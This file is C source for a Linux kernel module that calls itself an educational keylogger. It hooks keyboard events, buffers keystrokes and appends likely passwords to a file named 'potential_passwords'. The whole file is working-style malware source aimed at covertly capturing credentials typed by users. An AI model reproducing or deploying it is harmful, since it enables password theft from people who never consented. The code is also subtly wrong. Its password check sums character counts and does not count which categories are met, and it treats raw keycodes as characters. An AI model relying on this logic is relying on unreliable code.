#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Gray");
MODULE_DESCRIPTION("Keylogger for Educational Purposes");

#define PROC_FILENAME "potential_passwords"
#define BUFFER_SIZE 15

// Criteria bitmask constants
#define CRITERIA_LOWERCASE 1
#define CRITERIA_UPPERCASE 2
#define CRITERIA_NUMBER    4
#define CRITERIA_SYMBOL    8

static struct proc_dir_entry* proc_file;

// A function that will track the characters (amount defined in BUFFER_SIZE) typed on a keyboard and store them in an optimal data structure, acting as a buffer for analysis.
// Each element of the buffer will contain the character and timestamp in jiffies of the keypress. The function will be called whenever a key is pressed, and will update the buffer with the new character converted from the keycode, and timestamp.
// If the buffer reaches the limit defined in BUFFER_SIZE, it will call another function to analyze the buffer for potential passwords.
// The analysis function will check each element in the buffer for lowercase, uppercase, number, and symbol characters.
// If the buffer contains characters that meet 3 of the 4 criteria, it will write the characters to a proc file in the order they were typed, and then clear the buffer.

// The buffer will be implemented as a rolling buffer, meaning that once it reaches the maximum length, it will start overwriting the oldest characters with the newest ones, checking for potential passwords along the way.
// The four criteria will use bitmask constants to check for lowercase, uppercase, number, and symbol characters in the potential password.
// The overall goal is to make a simple keylogger program that logs potential passwords typed on a Linux system, implemented as a kernel module.

// Structure to hold the buffer element
struct buffer_element {
    char character;
    unsigned long timestamp;
};

// Buffer to store the typed characters
static struct buffer_element buffer[BUFFER_SIZE];
static int buffer_index = 0;

// Function to analyze the buffer for potential passwords
static void analyze_buffer(void) {
    int lowercase_count = 0;
    int uppercase_count = 0;
    int number_count = 0;
    int symbol_count = 0;

    // Check each element in the buffer
    for (int i = 0; i < BUFFER_SIZE; i++) {
        char character = buffer[i].character;

        // Check for lowercase character
        if (character >= 'a' && character <= 'z') {
            lowercase_count++;
        }
        // Check for uppercase character
        else if (character >= 'A' && character <= 'Z') {
            uppercase_count++;
        }
        // Check for number character
        else if (character >= '0' && character <= '9') {
            number_count++;
        }
        // Check for symbol character
        else {
            symbol_count++;
        }
    }

    // Check if the buffer contains characters that meet 3 of the 4 criteria
    if ((lowercase_count + uppercase_count + number_count + symbol_count) >= 3) {
        // Open the proc file for writing
        struct file *file = filp_open(PROC_FILENAME, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (file) {
            // Write the characters to the proc file in the order they were typed
            for (int i = 0; i < BUFFER_SIZE; i++) {
                char character = buffer[i].character;
                if (character != '\0') {
                    char str[2] = {character, '\0'};
                    kernel_write(file, str, 1, &file->f_pos);
                }
            }
            // Clear the buffer
            memset(buffer, 0, sizeof(buffer));
            buffer_index = 0;

            // Close the proc file
            filp_close(file, NULL);
        }
    }
}

// Function to track the characters typed on a keyboard
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    // Check if a key is pressed
    if (code == KBD_KEYCODE && param->down) {
        // Convert the keycode to character
        char character = param->value;

        // Store the character and timestamp in the buffer
        buffer[buffer_index].character = character;
        buffer[buffer_index].timestamp = jiffies;

        // Increment the buffer index
        buffer_index++;

        // Check if the buffer is full
        if (buffer_index >= BUFFER_SIZE) {
            // Analyze the buffer for potential passwords
            analyze_buffer();
        }
    }

    // Call the next notifier block
    return NOTIFY_OK;
}

// Notifier block for the keyboard events
static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

// Module initialization function
static int __init keylogger_init(void) {
    // Register the keyboard notifier block
    register_keyboard_notifier(&keylogger_nb);

    // Create the proc file
    proc_file = proc_create(PROC_FILENAME, 0644, NULL, NULL);
    if (!proc_file) {
        unregister_keyboard_notifier(&keylogger_nb);
        return -ENOMEM;
    }

    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

// Module exit function
static void __exit keylogger_exit(void) {
    // Unregister the keyboard notifier block
    unregister_keyboard_notifier(&keylogger_nb);

    // Remove the proc file
    proc_remove(proc_file);

    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);